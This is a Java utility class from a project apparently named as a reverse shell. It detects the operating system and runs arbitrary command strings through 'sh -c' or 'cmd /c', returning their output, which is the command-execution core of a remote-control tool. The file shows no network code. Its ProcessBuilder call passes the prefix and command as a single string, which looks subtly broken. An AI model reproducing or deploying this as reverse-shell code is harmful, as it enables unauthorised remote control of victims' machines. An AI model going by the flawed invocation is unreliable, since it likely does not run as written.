package com.mtattab.reverseshell.util;

import lombok.experimental.UtilityClass;
import lombok.extern.java.Log;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

@UtilityClass
@Log
public class SystemCommandProxyUtil {

    private static String            os     = null;
    private static String            shellCommand  = null;


    public static boolean detect() {

        boolean detected = true;
        os = System.getProperty("os.name").toUpperCase();
        if (os.toUpperCase().contains("LINUX") || os.toUpperCase().contains("MAC")) {
            os    = "LINUX";
            shellCommand = "sh -c ";
        } else if (os.toUpperCase().contains("WIN")) {
            os    = "WINDOWS";
            shellCommand = "cmd /c ";
        } else {
            throw new RuntimeException("Underlying operating system is not supported, program will now exit...");
        }
        return detected;
    }

    public static String executeCommand(String command) {


        ProcessBuilder processBuilder = new ProcessBuilder(shellCommand + command);
        processBuilder.redirectErrorStream(true);

        try {
            Process process = processBuilder.start();
            InputStream inputStream = process.getInputStream();
            Scanner scanner = new Scanner(inputStream, StandardCharsets.UTF_8).useDelimiter("\\A");
            String output = scanner.hasNext() ? scanner.next() : "";
            int exitCode = process.waitFor();
            System.out.println("exitCode: "+exitCode +"; output: "+  output);

            if (exitCode == 0) {
                return "Command executed successfully\n" + output;
            } else {
                return "Command exited with code " + exitCode + "\n" + output;
            }

        } catch (IOException | InterruptedException e) {
            e.printStackTrace();

            return "Error: " + e.getMessage();
        }
    }
}
